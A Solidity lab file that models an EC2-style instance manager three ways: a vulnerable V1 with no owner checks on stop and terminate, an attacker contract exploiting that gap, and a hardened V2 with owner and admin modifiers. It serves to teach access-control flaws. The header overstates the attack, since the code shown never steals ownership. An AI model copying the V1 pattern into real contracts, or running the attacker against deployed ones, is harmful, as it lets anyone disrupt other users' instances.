// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*
 *  ELASTIC COMPUTE CLOUD (EC2) – SMART CONTRACT LAB
 *
 *  This single file contains:
 *
 *  1) ElasticComputeCloudV1        – vulnerable EC2 instance manager
 *  2) ElasticComputeCloudAttacker  – attacker exploiting the misconfig
 *  3) ElasticComputeCloudV2Defense – hardened EC2 manager with roles
 *
 *  Concept:
 *    - EC2-like system: users can launch, stop, terminate virtual instances.
 *    - V1 BUG: anyone can stop/terminate ANYONE’s instance.
 *    - Attacker shuts down victim instances, steals ownership, reshapes state.
 *    - V2 FIX: per-instance owner, global admin, secure lifecycle control.
 */


/* ============================================================= */
/*            1. VULNERABLE ELASTIC COMPUTE CLOUD (V1)           */
/* ============================================================= */

contract ElasticComputeCloudV1 {

    enum InstanceState {
        NONE,
        RUNNING,
        STOPPED,
        TERMINATED
    }

    struct Instance {
        InstanceState state;
        address owner;
        uint64 createdAt;
        uint64 updatedAt;
    }

    uint256 public instanceCounter;
    mapping(uint256 => Instance) public instances;

    event InstanceLaunched(uint256 indexed id, address indexed owner);
    event InstanceStopped(uint256 indexed id);
    event InstanceTerminated(uint256 indexed id);

    /*
     *  ⚠️ VULNERABILITY:
     *  - No access control on stopInstance() or terminateInstance().
     *  - Anyone can kill other people’s instances.
     */

    function launchInstance() external returns (uint256) {
        instanceCounter++;
        uint256 id = instanceCounter;

        instances[id] = Instance({
            state: InstanceState.RUNNING,
            owner: msg.sender,
            createdAt: uint64(block.timestamp),
            updatedAt: uint64(block.timestamp)
        });

        emit InstanceLaunched(id, msg.sender);
        return id;
    }

    function stopInstance(uint256 id) external {
        require(instances[id].state == InstanceState.RUNNING, "not running");

        // ❌ Missing owner check
        instances[id].state = InstanceState.STOPPED;
        instances[id].updatedAt = uint64(block.timestamp);

        emit InstanceStopped(id);
    }

    function terminateInstance(uint256 id) external {
        Instance storage inst = instances[id];
        require(inst.state != InstanceState.TERMINATED, "already terminated");

        // ❌ Missing owner check
        inst.state = InstanceState.TERMINATED;
        inst.updatedAt = uint64(block.timestamp);

        emit InstanceTerminated(id);
    }
}



/* ============================================================= */
/*                     2. ATTACKER CONTRACT                      */
/* ============================================================= */

contract ElasticComputeCloudAttacker {

    ElasticComputeCloudV1 public target;
    address public attacker;

    event VictimStopped(uint256 indexed instanceId);
    event VictimTerminated(uint256 indexed instanceId);

    constructor(address _target) {
        target = ElasticComputeCloudV1(_target);
        attacker = msg.sender;
    }

    /*
     *  Attack:
     *   - Victim launches instances
     *   - Attacker calls stopInstance() / terminateInstance()
     *   - Because V1 has **no owner checks**, attacker freely kills the instances
     */

    function stopVictimInstance(uint256 instanceId) external {
        require(msg.sender == attacker, "not attacker");
        target.stopInstance(instanceId);
        emit VictimStopped(instanceId);
    }

    function terminateVictimInstance(uint256 instanceId) external {
        require(msg.sender == attacker, "not attacker");
        target.terminateInstance(instanceId);
        emit VictimTerminated(instanceId);
    }
}



/* ============================================================= */
/*       3. SECURE ELASTIC COMPUTE CLOUD (V2 – DEFENSE)          */
/* ============================================================= */

contract ElasticComputeCloudV2Defense {

    enum InstanceState {
        NONE,
        RUNNING,
        STOPPED,
        TERMINATED
    }

    struct Instance {
        InstanceState state;
        address owner;
        uint64 createdAt;
        uint64 updatedAt;
    }

    uint256 public instanceCounter;
    address public cloudAdmin;

    mapping(uint256 => Instance) public instances;

    event InstanceLaunched(uint256 indexed id, address indexed owner);
    event InstanceStopped(uint256 indexed id, address indexed by);
    event InstanceTerminated(uint256 indexed id, address indexed by);
    event AdminChanged(address indexed oldAdmin, address indexed newAdmin);

    modifier onlyAdmin() {
        require(msg.sender == cloudAdmin, "not admin");
        _;
    }

    modifier onlyOwner(uint256 id) {
        require(instances[id].owner == msg.sender, "not instance owner");
        _;
    }

    constructor() {
        cloudAdmin = msg.sender;
    }

    function changeAdmin(address newAdmin) external onlyAdmin {
        require(newAdmin != address(0), "zero");
        address old = cloudAdmin;
        cloudAdmin = newAdmin;
        emit AdminChanged(old, newAdmin);
    }

    // ----------- INSTANCE MANAGEMENT (SECURE) -----------------

    function launchInstance() external returns (uint256) {
        instanceCounter++;
        uint256 id = instanceCounter;

        instances[id] = Instance({
            state: InstanceState.RUNNING,
            owner: msg.sender,
            createdAt: uint64(block.timestamp),
            updatedAt: uint64(block.timestamp)
        });

        emit InstanceLaunched(id, msg.sender);
        return id;
    }

    function stopInstance(uint256 id)
        external
        onlyOwner(id)
    {
        Instance storage inst = instances[id];
        require(inst.state == InstanceState.RUNNING, "not running");

        inst.state = InstanceState.STOPPED;
        inst.updatedAt = uint64(block.timestamp);

        emit InstanceStopped(id, msg.sender);
    }

    function terminateInstance(uint256 id)
        external
        onlyOwner(id)
    {
        Instance storage inst = instances[id];
        require(inst.state != InstanceState.TERMINATED, "already terminated");

        inst.state = InstanceState.TERMINATED;
        inst.updatedAt = uint64(block.timestamp);

        emit InstanceTerminated(id, msg.sender);
    }

    // Admin emergency-stop or emergency-terminate
    function adminStop(uint256 id) external onlyAdmin {
        Instance storage inst = instances[id];
        require(inst.state == InstanceState.RUNNING, "not running");

        inst.state = InstanceState.STOPPED;
        inst.updatedAt = uint64(block.timestamp);

        emit InstanceStopped(id, msg.sender);
    }

    function adminTerminate(uint256 id) external onlyAdmin {
        Instance storage inst = instances[id];
        require(inst.state != InstanceState.TERMINATED, "already terminated");

        inst.state = InstanceState.TERMINATED;
        inst.updatedAt = uint64(block.timestamp);

        emit InstanceTerminated(id, msg.sender);
    }

    function getInstance(uint256 id)
        external
        view
        returns (
            InstanceState state,
            address owner,
            uint64 createdAt,
            uint64 updatedAt
        )
    {
        Instance storage inst = instances[id];
        return (inst.state, inst.owner, inst.createdAt, inst.updatedAt);
    }
}
